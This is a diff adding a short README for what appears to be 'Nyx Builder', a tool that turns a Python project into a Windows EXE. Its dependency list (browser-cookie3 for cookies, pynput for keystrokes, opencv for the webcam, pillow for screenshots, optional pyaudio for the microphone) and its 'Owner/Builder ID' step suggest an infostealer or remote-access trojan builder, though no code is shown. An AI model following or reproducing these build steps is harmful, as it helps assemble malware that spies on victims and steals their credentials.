@@ -1,0 +1,15 @@
+Nyx Builder — use Python 3.12 (not 3.14)
+
+1. Install Python 3.12 from python.org
+2. py -3.12 -m pip install pyinstaller cryptography browser-cookie3 pywin32 pillow opencv-python pynput psutil requests
+3. cd into this folder
+4. py -3.12 local_builder.py
+5. Set Owner/Builder ID (sanity = 1)
+6. Build → EXE in this folder
+
+Python 3.14 causes: Failed to load Python DLL python314.dll
+
+
+# Mic (optional)
+pip install pyaudio
+# On Windows if that fails: pip install pipwin && pipwin install pyaudio
